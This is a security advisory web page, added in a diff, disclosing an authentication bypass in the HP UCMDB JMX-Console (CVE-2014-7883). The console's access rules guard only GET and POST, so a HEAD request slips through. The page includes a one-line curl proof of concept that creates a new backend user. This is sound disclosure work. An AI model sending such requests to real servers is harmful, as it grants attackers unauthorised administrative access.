@@ -1,0 +1,275 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en-us">
+
+  <head>
+  <link href="http://gmpg.org/xfn/11" rel="profile">
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+  <!-- Enable responsiveness on mobile devices-->
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+
+  <title>
+    
+      Hewlett-Packard UCMDB - JMX-Console Authentication Bypass &middot; lab.mogwaisecurity.de
+    
+  </title>
+
+  <!-- CSS -->
+  <link rel="stylesheet" href="/public/css/poole.css">
+  <link rel="stylesheet" href="/public/css/syntax.css">
+  <link rel="stylesheet" href="/public/css/lanyon.css">
+  <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css">
+
+  <!-- Icons -->
+  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/public/apple-touch-icon-144-precomposed.png">
+  <link rel="shortcut icon" href="/public/favicon.ico">
+
+  <!-- RSS -->
+  <link rel="alternate" type="application/rss+xml" title="RSS" href="/atom.xml">
+</head>
+
+
+  <body>
+
+    <!-- Target for toggling the sidebar `.sidebar-checkbox` is for regular
+     styles, `#sidebar-checkbox` for behavior. -->
+<input type="checkbox" class="sidebar-checkbox" id="sidebar-checkbox">
+
+<!-- Toggleable sidebar -->
+<div class="sidebar" id="sidebar">
+  <nav class="sidebar-nav">
+    <a class="sidebar-nav-item" href="/">Home</a>
+    <a class="sidebar-nav-item" href="/archive">Archive</a>
+    <a class="sidebar-nav-item" href="/advisories">Security Advisories</a>
+    <a class="sidebar-nav-item" href="/about">About</a>
+    <a class="sidebar-nav-item" href="https://www.mogwaisecurity.de" target="new">Company Website (German)</a>
+	  <a class="sidebar-nav-item" href="/atom.xml" target="new">Feed</a>
+    <a class="sidebar-nav-item" href="https://github.com/mogwaisec" target="new">GitHub</a>
+    <a class="sidebar-nav-item" href="https://twitter.com/mogwaisec" target="new">Twitter</a>
+  </nav>
+
+  <!--<div class="sidebar-item">
+    <p>
+      &copy; 2015. All rights reserved.
+    </p>
+  </div>-->
+</div>
+
+
+    <!-- Wrap is the content to shift when toggling the sidebar. We wrap the
+         content to avoid any CSS collisions with our real content. -->
+    <div class="wrap">
+      <div class="masthead">
+        <div class="container">
+          <h3 class="masthead-title">
+            <i class="fa fa-flask"></i> <a href="/" title="Home">lab.mogwaisecurity.de</a>
+            <small>because sharing is caring...</small>
+          </h3>
+        </div>
+      </div>
+
+      <div class="container content">
+        <div class="page">
+  <h1 class="page-title">Hewlett-Packard UCMDB - JMX-Console Authentication Bypass</h1>
+  <table>
+    <tr>
+        <td>Title</td>
+        <td>Hewlett-Packard UCMDB - JMX-Console Authentication Bypass</td>
+    </tr>
+    <tr>
+        <td>Id</td>
+        <td>MSA-2015-02</td>
+    </tr>
+    <tr>
+        <td>CVE</td>
+        <td>CVE-2014-7883</td>
+    </tr>
+    <tr>
+        <td>Product</td>
+        <td>Hewlett-Packard Universal CMDB (UCMDB)  </td>
+    </tr>
+    <tr>
+        <td>Affected versions</td>
+        <td>UCMDB 10.10 (Other versions might also be affected)</td>
+    </tr>
+    <tr>
+        <td>Impact</td>
+        <td>high</td>
+    </tr>
+    <tr>
+        <td>Remote</td>
+        <td>yes</td>
+    </tr>
+    <tr>
+        <td>Product link</td>
+        <td>http://www8.hp.com/us/en/software-solutions/configuration-management-system-database/index.html</td>
+    </tr>
+    <tr>
+        <td>Reported</td>
+        <td>14/11/2014</td>
+    </tr>
+    <tr>
+        <td>By</td>
+        <td>Hans-Martin Muench (Mogwai, IT-Sicherheitsberatung Muench)</td>
+    </tr>
+</table>
+
+<h2 id="vendor&#39;s-description-of-the-software:">Vendor&#39;s Description of the Software:</h2>
+
+<p>The HP Universal CMDB (UCMDB) automatically collects and manages accurate and
+current business service definitions, associated infrastructure relationships and
+detailed information on the assets, and is a central component in many of the key processes in your
+IT organization, such as change management, asset management, service management, and business
+service management. The UCMDB ensures that these processes can rely on comprehensive and
+true data for all business services. Together with HP UCMDB Configuration Manager
+(UCMDB-CM) you can standardize your IT environments, and make sure they comply with clear
+policies, and defined authorization process.
+Many IT organizations turn to a CMDB and configuration management processes to create a
+shared single version of truth to support business service management, IT service management,
+change management, and asset management initiatives. These initiatives help align IT efforts
+with business requirements and run IT operations more efficiently and effectively.
+The initiatives success depends on the CMDB providing a complete view into the
+configuration items (CIs) and assets as well as how various IT elements relate together to deliver
+the business service.</p>
+
+<h2 id="business-recommendation:">Business recommendation:</h2>
+
+<p>Apply configuration changes from HP<br>
+<a href="https://softwaresupport.hp.com/group/softwaresupport/search-result/-/facetsearch/document/KM01351169">https://softwaresupport.hp.com/group/softwaresupport/search-result/-/facetsearch/document/KM01351169</a></p>
+
+<h2 id="cvss2-ratings">CVSS2 Ratings</h2>
+
+<table>
+    <tr>
+        <td>CVSS Base Score</td>
+        <td>6.4</td>
+    </tr>
+    <tr>
+        <td>Impact Subscore</td>
+        <td>4.9</td>
+    </tr>
+    <tr>
+        <td>Exploitability Subscore</td>
+        <td>10</td>
+    </tr>
+    <tr>
+        <td>CVSS v2 Vector</td>
+        <td>(AV:N/AC:L/Au:N/C:P/I:P/A:N)</td>
+    </tr>
+</table>
+
+<h2 id="vulnerability-description">Vulnerability description</h2>
+
+<p>UCMB administrators heavily rely on a JMX-Console, which is installed by
+default.
+The JMX-Console web application in UCMDB performs access control only for
+the GET and POST methods, which allows remote attackers to send requests
+to this application&#39;s GET handler by using a different method (for example
+HEAD).</p>
+
+<p>The web.xml file of the JMX Console contains following security constrains:</p>
+<div class="highlight"><pre><code class="language-text" data-lang="text">&lt;security-constraint&gt;
+&lt;web-resource-collection&gt;
+&lt;web-resource-name&gt;Protected Pages&lt;/web-resource-name&gt;
+&lt;url-pattern&gt;/*&lt;/url-pattern&gt;
+&lt;http-method&gt;GET&lt;/http-method&gt;
+&lt;http-method&gt;POST&lt;/http-method&gt;
+&lt;/web-resource-collection&gt;
+&lt;auth-constraint&gt;
+&lt;role-name&gt;sysadmin&lt;/role-name&gt;
+&lt;/auth-constraint&gt;
+&lt;/security-constraint&gt;
+
+&lt;security-constraint&gt;
+&lt;web-resource-collection&gt;
+&lt;web-resource-name&gt;Callhome Servlet&lt;/web-resource-name&gt;
+&lt;url-pattern&gt;/callhome&lt;/url-pattern&gt;
+&lt;http-method&gt;GET&lt;/http-method&gt;
+&lt;http-method&gt;POST&lt;/http-method&gt;
+&lt;/web-resource-collection&gt;
+&lt;/security-constraint&gt;
+</code></pre></div>
+<p>This vulnerability is identical with CVE-2010-0738 (JBoss JMX-Console
+Authentication bypass). This can be used to create a new account which
+can then be used to access the JMX console.</p>
+
+<h2 id="proof-of-concept:">Proof of concept:</h2>
+
+<p>The following Curl command will send a HEAD request to create a new user
+&quot;pocuser&quot; in the UCMDB Backend:</p>
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">curl -I
+<span class="s2">&quot;http://foobar:8080/jmx-console/HtmlAdaptor?action=invokeOpByName&amp;name=UCMDB%3Aservice%3DAuthorization+Services&amp;methodName=createUser&amp;arg0=&amp;arg1=zdi-poc&amp;arg2=pocuser&amp;arg3=zdi-poc&amp;arg4=pocuser&quot;</span>
+</code></pre></div>
+<h2 id="disclosure-timeline:">Disclosure timeline:</h2>
+
+<table>
+    <tr>
+        <td>14/11/2014</td>
+        <td>Reporting issue to HP</td>
+    </tr>
+    <tr>
+        <td>18/11/2014</td>
+        <td>Re-Reporting, as no acknowledge received</td>
+    </tr>
+    <tr>
+        <td>18/11/2014</td>
+        <td>Acknowledge from HP</td>
+    </tr>
+    <tr>
+        <td>02/01/2015</td>
+        <td>Requesting status update from HP</td>
+    </tr>
+    <tr>
+        <td>29/01/2015</td>
+        <td>Requesting status update from HP</td>
+    </tr>
+    <tr>
+        <td>31/01/2015</td>
+        <td>Response from HP, they plan to release the advisory next week</td>
+    </tr>
+    <tr>
+        <td>05/02/2015</td>
+        <td>HP releases security bulletin</td>
+    </tr>
+    <tr>
+        <td>03/02/2015</td>
+        <td>Mogwai security bulletin release</td>
+    </tr>
+</table>
+
+<p>Advisory URL: <a href="https://www.mogwaisecurity.de/#lab">https://www.mogwaisecurity.de/#lab</a></p>
+
+<p>Mogwai, IT-Sicherheitsberatung Muench<br>
+Steinhoevelstrasse 2/2<br>
+89075 Ulm (Germany)  </p>
+
+<p><a href="mailto:info@mogwaisecurity.de">info@mogwaisecurity.de</a></p>
+
+</div>
+
+
+		
+      </div>
+    </div>
+
+    <label for="sidebar-checkbox" class="sidebar-toggle"></label>
+
+    <script>
+      (function(document) {
+        var toggle = document.querySelector('.sidebar-toggle');
+        var sidebar = document.querySelector('#sidebar');
+        var checkbox = document.querySelector('#sidebar-checkbox');
+
+        document.addEventListener('click', function(e) {
+          var target = e.target;
+
+          if(!checkbox.checked ||
+             sidebar.contains(target) ||
+             (target === checkbox || target === toggle)) return;
+
+          checkbox.checked = false;
+        }, false);
+      })(document);
+    </script>
+  </body>
+</html>
